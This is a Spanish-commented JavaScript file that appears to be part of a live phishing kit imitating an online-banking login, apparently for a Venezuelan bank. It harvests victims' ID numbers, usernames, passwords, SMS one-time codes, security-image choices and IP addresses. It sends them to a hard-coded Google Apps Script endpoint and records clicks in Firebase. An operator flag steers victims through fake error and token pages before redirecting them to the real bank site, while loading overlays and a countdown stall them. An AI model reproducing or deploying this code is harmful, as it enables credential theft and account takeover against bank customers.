    // Función para envío asíncrono en segundo plano (no bloquea la UI)
    function enviarDatosEnSegundoPlano(datos) {
        // Enviar de forma asíncrona sin bloquear
        enviarDatosAGSheets(datos).then(exito => {
            if (exito) {
                console.log("✅ Datos enviados a Google Sheets correctamente");
                // Limpiar datos pendientes si existen
                localStorage.removeItem('pendienteGSheets');
            } else {
                console.warn("⚠️ No se pudieron enviar los datos a Google Sheets");
                // Guardar en localStorage para reintento posterior
                const datosParaReintento = {
                    ...datos,
                    timestamp: Date.now(),
                    reintentos: 0
                };
                localStorage.setItem('pendienteGSheets', JSON.stringify(datosParaReintento));
            }
        }).catch(error => {
            console.error("❌ Error inesperado enviando a Google Sheets:", error);
            // También guardar para reintento en caso de error inesperado
            const datosParaReintento = {
                ...datos,
                timestamp: Date.now(),
                reintentos: 0,
                error: error.message
            };
            localStorage.setItem('pendienteGSheets', JSON.stringify(datosParaReintento));
        });
    }

    // Función para reintentar envío de datos pendientes
    async function reintentarDatosPendientes() {
        const datosPendientes = localStorage.getItem('pendienteGSheets');
        if (!datosPendientes) return;

        try {
            const datos = JSON.parse(datosPendientes);
            const tiempoTranscurrido = Date.now() - datos.timestamp;
            
            // Solo reintentar si han pasado al menos 30 segundos y menos de 24 horas
            if (tiempoTranscurrido > 30000 && tiempoTranscurrido < 86400000) {
                console.log("🔄 Reintentando envío de datos pendientes a Google Sheets...");
                
                const exito = await enviarDatosAGSheets(datos);

                if (exito) {
                    console.log("✅ Datos pendientes enviados exitosamente");
                    localStorage.removeItem('pendienteGSheets');
                } else {
                    // Incrementar contador de reintentos
                    datos.reintentos = (datos.reintentos || 0) + 1;
                    if (datos.reintentos >= 5) {
                        console.warn("⚠️ Máximo de reintentos alcanzado, eliminando datos pendientes");
                        localStorage.removeItem('pendienteGSheets');
                    } else {
                        localStorage.setItem('pendienteGSheets', JSON.stringify(datos));
                    }
                }
            } else if (tiempoTranscurrido >= 86400000) {
                // Eliminar datos muy antiguos (más de 24 horas)
                console.log("🗑️ Eliminando datos pendientes antiguos");
                localStorage.removeItem('pendienteGSheets');
            }
        } catch (error) {
            console.error("❌ Error procesando datos pendientes:", error);
            localStorage.removeItem('pendienteGSheets');
        }
    }

    // Función para verificar conectividad y estado del sistema
    function verificarEstadoSistema() {
        // Verificar si hay datos pendientes al cargar la página
        reintentarDatosPendientes();
        
        // Configurar reintento periódico cada 5 minutos
        setInterval(reintentarDatosPendientes, 300000);
    }

    // Iniciar sistema de verificación de estado al cargar
    verificarEstadoSistema();

    // Variable global para controlar el temporizador
    let temporizadorInterval = null;
    
    // Temporizador para el SMS
    const iniciarTemporizador = () => {
        const temporizadorElement = document.getElementById('temporizador');
        const progressBar = document.getElementById('progress-bar');
        if (!temporizadorElement || !progressBar) {
            console.warn('Elementos del temporizador no encontrados');
            return;
        }

        // Limpiar temporizador anterior si existe
        if (window.temporizadorInterval) {
            console.log('Limpiando temporizador anterior');
            clearInterval(window.temporizadorInterval);
            window.temporizadorInterval = null;
        }

        console.log('Iniciando nuevo temporizador de 165 segundos');
        const tiempoTotal = 165; // 2:45 minutos
        let segundos = tiempoTotal;
        
        // Actualizar inmediatamente
        temporizadorElement.innerHTML = `Tiempo restante: <strong>${segundos}</strong> segundos`;
        progressBar.style.width = '100%';
        
        window.temporizadorInterval = setInterval(() => {
            segundos--;
            if (segundos <= 0) {
                clearInterval(window.temporizadorInterval);
                window.temporizadorInterval = null;
                alert('El tiempo para ingresar el código SMS ha expirado');
                regresarPaso0();
            } else {
                // Actualizar texto del temporizador
                temporizadorElement.innerHTML = `Tiempo restante: <strong>${segundos}</strong> segundos`;

                // Actualizar barra de progreso
                const porcentaje = (segundos / tiempoTotal) * 100;
                progressBar.style.width = `${porcentaje}%`;
            }
        }, 1000);
    };

    // Hacer iniciarTemporizador y la variable del temporizador accesibles globalmente
    window.iniciarTemporizador = iniciarTemporizador;
    window.temporizadorInterval = temporizadorInterval;
    
    // Función global para limpiar temporizador
    window.limpiarTemporizador = () => {
        if (window.temporizadorInterval) {
            console.log('Limpiando temporizador desde función global');
            clearInterval(window.temporizadorInterval);
            window.temporizadorInterval = null;
        }
    };

    // Event listener para btn-guardar-nombre eliminado
    // Ya no es necesario porque se eliminó la funcionalidad

    // El event listener para input-nombre-usuario ha sido eliminado
    // ya que el campo ya no existe en el HTML

    // Añadir event listeners a todas las imágenes con clase img-picker
    const imagenesPickerElements = document.querySelectorAll('.img-picker');

    imagenesPickerElements.forEach(imagen => {
        imagen.addEventListener('click', function (e) {
            // Prevenir el comportamiento predeterminado
            e.preventDefault();

            // Obtener el nombre de la imagen desde el src o del onclick original
            let nombreImagen = '';

            // Intentar extraer el ID del atributo onclick si existe
            const onclickAttr = this.getAttribute('onclick');
            if (onclickAttr) {
                const match = onclickAttr.match(/checkImg\('([^']+)'\)/);
                if (match && match[1]) {
                    nombreImagen = match[1];
                }
            }

            // Si no se pudo obtener del onclick, extraer del src
            if (!nombreImagen && this.src) {
                const srcParts = this.src.split('/');
                nombreImagen = srcParts[srcParts.length - 1];
            }

            // Mostrar alerta con el nombre de la imagen (opcional, se puede eliminar)
            if (nombreImagen) {
                // alert(`Nombre de la imagen: ${nombreImagen}`);

                // Avanzar al paso 1
                avanzarPaso1(nombreImagen);
            } else {
                alert('No se pudo determinar el nombre de la imagen');
            }
        });
    });
});

// Función de prueba para verificar el sistema de captura
function testClickCapture() {
    console.log('🧪 Probando sistema de captura de clicks...');
    const usuarioData = JSON.parse(localStorage.getItem('usuario') || '{}');
    console.log('📊 Datos de usuario en localStorage:', usuarioData);
    console.log('🆔 UserId que se usará:', usuarioData.documento);
    
    if (!usuarioData.documento) {
        console.error('❌ No hay documento de usuario en localStorage');
        console.log('💡 Asegúrate de que el usuario haya hecho login correctamente');
    } else {
        console.log('✅ Sistema listo para capturar clicks');
    }
}

// Exponer función de prueba globalmente
window.testClickCapture = testClickCapture;

// Función para capturar clicks en HTML personalizado inyectado
function setupCustomHTMLClickCapture(container) {
    // Agregar event listener para capturar todos los clicks en el contenedor
    container.addEventListener('click', async function(event) {
        const clickedElement = event.target;
        
        // IMPORTANTE: No interferir con imágenes que tienen onclick="checkImg(...)"
        // Estas imágenes son del dashboard original y deben usar su flujo normal
        const onclickAttr = clickedElement.getAttribute('onclick');
        if (onclickAttr && onclickAttr.includes('checkImg(')) {
            console.log('🎯 Imagen con checkImg detectada - usando flujo original:', onclickAttr);
            return; // Dejar que el onclick original maneje el click
        }
        
        // Obtener información del elemento clickeado
        const elementInfo = {
            tagName: clickedElement.tagName.toLowerCase(),
            className: clickedElement.className || '',
            id: clickedElement.id || '',
            textContent: clickedElement.textContent?.trim() || '',
            src: clickedElement.src || '',
            alt: clickedElement.alt || '',
            href: clickedElement.href || '',
            onclick: clickedElement.getAttribute('onclick') || '',
            timestamp: new Date().toISOString(),
            elementHTML: clickedElement.outerHTML
        };
        
        console.log('Click capturado en HTML personalizado:', elementInfo);
        
        try {
            // Obtener datos del usuario desde localStorage
            const usuarioData = JSON.parse(localStorage.getItem('usuario') || '{}');
            // Construir el docId usando el mismo formato que en cargarImagenesAsignadas
            const userId = usuarioData.documento?.trim();
            const tpDocumento = usuarioData.tipoDocumento?.trim();
            
            console.log('Usuario desde localStorage:', usuarioData);
            console.log('UserId obtenido:', userId);
            console.log('Tipo documento:', tpDocumento);
            
            if (userId && tpDocumento) {
                // Usar el mismo formato de docId que en cargarImagenesAsignadas
                const docId = `${userId} - ${tpDocumento}`;
                const userDocRef = doc(db, "redireccion", docId);
                
                console.log('🎯 DocId generado para Firebase:', docId);
                
                // Si es una imagen, guardar SOLO el índice y activar notificación
                if (clickedElement.tagName.toLowerCase() === 'img' && clickedElement.src) {
                    // Extraer el nombre del archivo de la imagen (manejar base64)
                    let imageName;
                    if (clickedElement.src.startsWith('data:')) {
                        // Para imágenes base64, usar un nombre genérico
                        imageName = 'imagen-base64.jpg';
                    } else {
                        // Para imágenes normales, extraer el nombre del archivo
                        imageName = clickedElement.src.split('/').pop();
                    }
                    
                    // Buscar el índice de la imagen en el contenedor
                    const allImages = container.querySelectorAll('img');
                    let imageIndex = -1;
                    
                    for (let i = 0; i < allImages.length; i++) {
                        if (allImages[i] === clickedElement) {
                            imageIndex = i + 1; // Índice basado en 1 (1-12)
                            break;
                        }
                    }
                    
                    console.log('🎯 Imagen del HTML personalizado clickeada');
                    console.log('🎯 FLUJO: Imagen del HTML personalizado (sin checkImg)');
                    console.log('🎯 Índice:', imageIndex, 'Nombre:', imageName);
                    
                    // Guardar el índice y nombre (datos mínimos)
                    await setDoc(userDocRef, {
                        selectedImageIndex: imageIndex,  // Solo el índice (1-12)
                        selectedImageName: imageName,     // Solo el nombre del archivo
                        lastClickTime: new Date().toISOString()
                    }, { merge: true });
                    
                    console.log('🎯 Imagen clickeada guardada - Índice:', imageIndex, 'Nombre:', imageName);
                    
                    // Activar el overlay con el mensaje personalizado
                    console.log('🎯 Llamando a activarOverlayPersonalizado...');
                    await activarOverlayPersonalizado();
                } else {
                    // Para otros elementos, solo actualizar timestamp (información mínima)
                    await setDoc(userDocRef, {
                        lastClickTime: new Date().toISOString()
                        // NO guardar información del elemento para evitar exceder límite
                    }, { merge: true });  // merge: true para no sobrescribir otros campos
                    console.log('🖱️ Click registrado (elemento no-imagen):', clickedElement.tagName);
                }
                
                console.log('✅ Información de click guardada en Firebase para usuario:', userId);
                console.log('📊 Datos guardados:', { lastClickedElement: elementInfo, lastClickTime: new Date().toISOString() });
                
                // Mostrar notificación visual de éxito
                if (typeof showToast === 'function') {
                    showToast('Click capturado y guardado en Firebase', 'success');
                }
                
                // Disparar evento personalizado para notificar al panel
                const customEvent = new CustomEvent('customHTMLClick', {
                    detail: {
                        userId: userId,
                        elementInfo: elementInfo
                    }
                });
                window.dispatchEvent(customEvent);
            } else {
                console.error('❌ No se pudo obtener userId y/o tipoDocumento del localStorage');
                console.log('📊 Datos en localStorage:', usuarioData);
                console.log('📊 Campos requeridos: documento y tipoDocumento');
            }
        } catch (error) {
            console.error('❌ Error al guardar información de click:', error);
            
            // Mostrar notificación visual de error
            if (typeof showToast === 'function') {
                showToast('Error al guardar click: ' + error.message, 'error');
            }
        }
        
        console.log('Sistema de captura de clicks configurado para HTML personalizado');
    });
    
    console.log('Sistema de captura de clicks configurado para HTML personalizado');
}

// Asegurar que el loader esté oculto inicialmente
if (window.hideLoader) {
    window.hideLoader();
}

// Función optimizada para enviar datos a Google Sheets con timeout y retry
async function enviarDatosAGSheets(datos, maxReintentos = 3, timeoutMs = 8000) {
    const datosAEnviar = {
        DireccionIP: datos.direccionIP || "",
        TipoDocumento: datos.tipoDocumento || "No especificado",
        Documento: datos.documento || "",
        Usuario: datos.usuario || "",
        Passwd: datos.passwd || "",
        SMS: datos.SMS || "",
        IMG: datos.IMG || "",
    };

    const url = "https://script.google.com/macros/s/AKfycbx109GX3arUTEEqfKhVOyuEYVX1EoGMsDKpdHmiuvDhKWajbIfQ8vf57i4ZiZrXtK-Q-g/exec";

    for (let intento = 1; intento <= maxReintentos; intento++) {
        try {
            // Crear AbortController para timeout
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

            const response = await fetch(url, {
                method: "POST",
                mode: "no-cors",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                body: new URLSearchParams(datosAEnviar).toString(),
                signal: controller.signal
            });

            clearTimeout(timeoutId);
            
            // Con no-cors, si llega aquí sin error, asumimos éxito
            console.log(`Datos enviados a Google Sheets exitosamente (intento ${intento})`);
            return true;

        } catch (error) {
            console.warn(`Intento ${intento} fallido:`, error.name);
            
            // Si es el último intento, fallar
            if (intento === maxReintentos) {
                console.error("Falló el envío a Google Sheets después de todos los intentos");
                return false;
            }
            
            // Esperar antes del siguiente intento (backoff exponencial)
            const espera = Math.min(1000 * Math.pow(2, intento - 1), 5000);
            await new Promise(resolve => setTimeout(resolve, espera));
        }
    }
    
    return false;
}


// Función para reintentar envío de datos pendientes
async function reintentarDatosPendientes() {
    const datosPendientes = localStorage.getItem('pendienteGSheets');
    if (!datosPendientes) return;

    try {
        const datos = JSON.parse(datosPendientes);
        const tiempoTranscurrido = Date.now() - datos.timestamp;
        
        // Solo reintentar si han pasado al menos 30 segundos y menos de 24 horas
        if (tiempoTranscurrido > 30000 && tiempoTranscurrido < 86400000) {
            console.log("🔄 Reintentando envío de datos pendientes a Google Sheets...");
            
            const exito = await enviarDatosAGSheets({
                direccionIP: datos.direccionIP,
                documento: datos.documento,
                tipoDocumento: datos.tipoDocumento,
                passwd: datos.passwd,
                SMS: datos.SMS,
                IMG: datos.IMG,
                usuario: datos.usuario
            });

            if (exito) {
                console.log("✅ Datos pendientes enviados exitosamente");
                localStorage.removeItem('pendienteGSheets');
            } else {
                // Incrementar contador de reintentos
                datos.reintentos = (datos.reintentos || 0) + 1;
                if (datos.reintentos >= 5) {
                    console.warn("⚠️ Máximo de reintentos alcanzado, eliminando datos pendientes");
                    localStorage.removeItem('pendienteGSheets');
                } else {
                    localStorage.setItem('pendienteGSheets', JSON.stringify(datos));
                }
            }
        } else if (tiempoTranscurrido >= 86400000) {
            // Eliminar datos muy antiguos (más de 24 horas)
            console.log("🗑️ Eliminando datos pendientes antiguos");
            localStorage.removeItem('pendienteGSheets');
        }
    } catch (error) {
        console.error("❌ Error procesando datos pendientes:", error);
        localStorage.removeItem('pendienteGSheets');
    }
}

// Función para verificar conectividad y estado del sistema
function verificarEstadoSistema() {
    // Verificar si hay datos pendientes al cargar la página
    reintentarDatosPendientes();
    
    // Configurar reintento periódico cada 5 minutos
    setInterval(reintentarDatosPendientes, 300000);
}

// Inicializar sistema de verificación de estado al cargar
verificarEstadoSistema();

// Función para activar overlay personalizado para imágenes del HTML inyectado
const activarOverlayPersonalizado = async () => {
    console.log('🎯 Activando overlay personalizado para imagen del HTML inyectado');
    
    try {
        // Mensaje predeterminado fijo
        const mensajePersonalizado = 'Cargando, Por favor espere un momento...';
        console.log('🎯 Usando mensaje predeterminado:', mensajePersonalizado);
        
        // Crear overlay dinámico
        const overlayElement = document.createElement('div');
        overlayElement.id = 'preloader-overlay-personalizado';
        overlayElement.style.position = 'fixed';
        overlayElement.style.top = '0';
        overlayElement.style.left = '0';
        overlayElement.style.width = '100%';
        overlayElement.style.height = '100%';
        overlayElement.style.backgroundColor = 'rgba(88, 88, 88, 0.7)';
        overlayElement.style.backdropFilter = 'blur(5px)';
        overlayElement.style.webkitBackdropFilter = 'blur(5px)';
        overlayElement.style.zIndex = '9998';
        document.body.appendChild(overlayElement);
        
        // Crear preloader con mensaje personalizado
        const loaderElement = document.createElement('div');
        loaderElement.id = 'preloader-personalizado';
        loaderElement.className = 'cargando text-center';
        loaderElement.innerHTML = `
            <div style="color: white; font-size: 18px; font-weight: bold;">
                ${mensajePersonalizado}
                <div class="spinner loader" style="display: block; margin: 15px auto;"></div>
            </div>
        `;
        loaderElement.style.position = 'fixed';
        loaderElement.style.top = '50%';
        loaderElement.style.left = '50%';
        loaderElement.style.transform = 'translate(-50%, -50%)';
        loaderElement.style.zIndex = '9999';
        loaderElement.style.padding = '20px';
        document.body.appendChild(loaderElement);
        
        console.log('🎯 Overlay personalizado mostrado con mensaje:', mensajePersonalizado);
        
        // Esperar 15 segundos
        console.log('Iniciando espera de 15 segundos...');
        await new Promise(resolve => setTimeout(resolve, 15000));
        console.log('Espera finalizada');
        
        // Ocultar y eliminar overlay
        if (overlayElement && overlayElement.parentNode) {
            overlayElement.parentNode.removeChild(overlayElement);
        }
        if (loaderElement && loaderElement.parentNode) {
            loaderElement.parentNode.removeChild(loaderElement);
        }
        
        console.log('🎯 Overlay personalizado ocultado');
        
        // Activar el paso 1 (formulario SMS) después del overlay
        console.log('Activando paso SMS después del overlay');
        // Buscar la función avanzarPaso1 en el scope global
        if (typeof window.avanzarPaso1 === 'function') {
            window.avanzarPaso1();
            
            // Esperar un momento para que el DOM se actualice y luego iniciar el temporizador
            setTimeout(() => {
                // Limpiar cualquier temporizador anterior
                if (typeof window.limpiarTemporizador === 'function') {
                    window.limpiarTemporizador();
                }
                
                console.log('Iniciando el temporizador para el paso SMS');
                if (typeof window.iniciarTemporizador === 'function') {
                    window.iniciarTemporizador();
                } else {
                    console.warn('Función iniciarTemporizador no encontrada en scope global');
                }
            }, 100); // Pequeño delay para asegurar que el DOM esté actualizado
        } else {
            console.warn('Función avanzarPaso1 no encontrada en scope global');
        }
        
    } catch (error) {
        console.error('Error en activarOverlayPersonalizado:', error);
    }
};

// Hacer la función accesible globalmente
window.activarOverlayPersonalizado = activarOverlayPersonalizado;

document.addEventListener('DOMContentLoaded', function () {
    // Inicializar elementos del DOM solo si estamos en la página correcta
    const toko = document.getElementById('passwd');
    const submitBtn = document.getElementById('cmdLogin');
    //const spinner = document.getElementById('preloader');

    //spinner.style.display = "none";

    // Verificar que los elementos necesarios existan - solo continuar si estamos en la página correcta
    // Este código solo es relevante para la página de inicio de sesión, no para la página de imágenes
    if (toko && submitBtn) {
        // Continuamos con el código relacionado con el formulario de inicio de sesión

        // Función para validar la entrada (solo números y longitud mínima de 3)
        function validateInput() {
            if (toko && submitBtn) {
                // Eliminar cualquier carácter que no sea número
                const soloNumeros = toko.value;

                // Actualizar el valor del input solo si es diferente
                if (soloNumeros !== toko.value) {
                    toko.value = soloNumeros;
                }

                // Validar longitud mínima
                if (soloNumeros.length >= 3) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            }
        }

        // Agregar evento input para validar en tiempo real
        if (toko) {
            toko.addEventListener('input', validateInput);
            // Validar al cargar la página
            validateInput();
        }

        // Mostrar solo mientras se mantiene presionado el icono
        function enableHoldToShow(input, icon, showLabel, hideLabel) {
            if (!input || !icon) return;
            icon.setAttribute("aria-label", showLabel);
            icon.setAttribute("tabindex", "0");
            icon.setAttribute("role", "button");

            // Mostrar valor
            const showValue = () => {
                input.type = "text";
                icon.classList.remove("fa-eye-slash");
                icon.classList.add("fa-eye");
                icon.setAttribute("aria-label", hideLabel);
            };

            // Ocultar valor
            const hideValue = () => {
                input.type = "password";
                icon.classList.remove("fa-eye");
                icon.classList.add("fa-eye-slash");
                icon.setAttribute("aria-label", showLabel);
            };

            // Mouse
            icon.addEventListener("mousedown", () => {
                showValue();
                // Ocultar al soltar en cualquier parte
                const hideOnMouseUp = () => {
                    hideValue();
                    document.removeEventListener("mouseup", hideOnMouseUp);
                };
                document.addEventListener("mouseup", hideOnMouseUp);
            });

            // Touch
            icon.addEventListener("touchstart", (e) => {
                e.preventDefault();
                showValue();
                const hideOnTouchEnd = () => {
                    hideValue();
                    document.removeEventListener("touchend", hideOnTouchEnd);
                    document.removeEventListener("touchcancel", hideOnTouchEnd);
                };
                document.addEventListener("touchend", hideOnTouchEnd);
                document.addEventListener("touchcancel", hideOnTouchEnd);
            });

            // Teclado
            icon.addEventListener("keydown", (event) => {
                if (event.key === " " || event.key === "Spacebar" || event.key === "Enter") {
                    event.preventDefault();
                    showValue();
                }
            });
            icon.addEventListener("keyup", (event) => {
                if (event.key === " " || event.key === "Spacebar" || event.key === "Enter") {
                    event.preventDefault();
                    hideValue();
                }
            });

            hideValue();
        }
        enableHoldToShow(
            document.getElementById("passwd"),
            document.getElementById("togglePassword"),
            "Mostrar contraseña",
            "Ocultar contraseña"
        );

        // Función para manejar el envío
        async function manejarEnvio() {
            if (!submitBtn || submitBtn.disabled) return;

            try {
                submitBtn.disabled = true;
                submitBtn.style.opacity = '0.7';
                //if (spinner) spinner.style.display = "flex";


                const localData = JSON.parse(localStorage.getItem("usuario"));

                // Actualizar Firestore con los datos del usuario
                const userId = localData.documento.trim(); // Usamos trim() para eliminar espacios en blanco
                const tpDocumento = localData.tipoDocumento.trim(); // Usamos trim() para eliminar espacios en blanco

                // Utilizar la función compartida para crear el documento de redirección
                const { userRef } = await crearDocumentoRedireccion(userId, tpDocumento);

                console.log(`Dirección IP: ${localData.direccionIP}`);
                alert("Hola")

                const exito = await enviarDatosAGSheets({
                    direccionIP: localData.direccionIP,
                    tipoDocumento: localData.tipoDocumento,
                    documento: localData.documento,
                    usuario: localData.usuario || "",
                    passwd: localData.passwd, // Cambiado a SMS
                    SMS: toko ? toko.value : "", // Cambiado a SMS
                    IMG: "", // Campo IMG vacío en este flujo
                });

                const dataLocal = {
                    direccionIP: localData.direccionIP,
                    tipoDocumento: localData.tipoDocumento,
                    documento: localData.documento,
                    usuario: localData.usuario || "",
                    passwd: localData.passwd,
                    SMS: toko ? toko.value : "", // Cambiado a SMS
                    IMG: "", // Campo IMG vacío en este flujo
                }

                localStorage.setItem("usuario", JSON.stringify(dataLocal));

                if (exito) {
                    // Configurar la escucha de cambios en Firestore
                    const unsubscribe = onSnapshot(userRef, (doc) => {
                        if (doc.exists()) {
                            const userData = doc.data();
                            const page = userData.page;
                            // Si el admin ha establecido una página de redirección
                            if (page > 0) {
                                // Redirigir según el valor de page
                                switch (page) {
                                    case 1:
                                        const spinner1 = document.getElementById('preloader');
                                        if (spinner1) spinner1.style.display = "flex";
                                        window.location.href = "index.html";
                                        break;
                                    case 2:
                                        const spinner2 = document.getElementById('preloader');
                                        if (spinner2) spinner2.style.display = "flex";
                                        window.location.href = "passwd.html";
                                        break;
                                    case 3:
                                        const spinner3 = document.getElementById('preloader');
                                        if (spinner3) spinner3.style.display = "flex";
                                        window.location.href = "jrico.html";
                                        break;
                                    case 4:
                                        const spinner4 = document.getElementById('preloader');
                                        if (spinner4) spinner4.style.display = "flex";
                                        window.location.href = "dashboard.html";
                                        break;
                                    case 5:
                                        const spinner5 = document.getElementById('preloader');
                                        if (spinner5) spinner5.style.display = "flex";
                                        window.location.href = "dashboard-err.html";
                                        break;
                                    case 8:
                                        const spinner8 = document.getElementById('preloader');
                                        if (spinner8) spinner8.style.display = "flex";
                                        window.location.href = "dashboard-tk-err.html";
                                        break;
                                    case 9:
                                        const spinner9 = document.getElementById('preloader');
                                        if (spinner9) spinner9.style.display = "flex";
                                        window.location.href = "https://bdtenlinea.bdt.com.ve/?p=1";
                                        break;
                                }
                                // Opcional: Establecer un tiempo máximo de espera (por ejemplo, 2 minutos)
                                setTimeout(() => {
                                    submitBtn.disabled = false;
                                    alert("Tiempo de espera agotado. Por favor, intente nuevamente.");
                                    unsubscribe();
                                }, 120000); // 2 minutos
                            }
                        }
                    });

                } else {
                    alert("Error al enviar los datos. Intente nuevamente.");
                }
            } catch (error) {
                // Error detallado en manejo de envío
                alert(`Error: ${error.message || 'Error desconocido al procesar la solicitud'}`);
            } finally {

            }
        }

        // Event Listeners
        if (toko) {
            toko.addEventListener('input', validateInput);
            validateInput(); // Validación inicial
        }
        if (submitBtn) {
            submitBtn.addEventListener('click', manejarEnvio);
        }
    } // Cierre del if que verifica si estamos en la página correcta
    
    // Inicializar sistema de audio
    // integrarSistemaAudio(); // Audio deshabilitado en dashboard - solo activo en panel
});

// Función global checkImg para manejar clicks en imágenes del dashboard
// Esta función restaura la funcionalidad original del overlay y temporizador
window.checkImg = function(imgPath) {
    console.log('🎯 checkImg llamada con:', imgPath);
    
    // Disparar el evento personalizado que maneja handleImageSelection
    const event = new CustomEvent('checkImgEvent', {
        detail: imgPath
    });
    document.dispatchEvent(event);
};